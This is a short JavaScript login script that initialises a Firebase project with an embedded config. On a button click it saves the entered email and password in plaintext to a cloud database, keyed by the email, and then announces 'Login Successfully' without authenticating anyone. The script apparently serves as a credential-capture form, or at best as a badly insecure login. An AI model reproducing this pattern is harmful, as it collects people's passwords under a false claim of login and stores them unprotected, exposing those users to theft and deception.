// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyA4serUDi5exUplfOnqvcccBBoUxmKNwsM",
  authDomain: "bmic-2c4bd.firebaseapp.com",
  projectId: "bmic-2c4bd",
  storageBucket: "bmic-2c4bd.appspot.com",
  messagingSenderId: "942405537171",
  appId: "1:942405537171:web:630a4db240c54373bf6c66",
  measurementId: "G-EGSHB2B671"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Get a reference to the database service
const db = getDatabase(app);

document.getElementById("yo").addEventListener('click', function(e) {
  e.preventDefault(); // Corrected typo

  set(ref(db, 'users/' + document.getElementById("email").value),
    {
      email: document.getElementById("email").value,
      password: document.getElementById("password").value
    });
  alert("Login Successfully");
})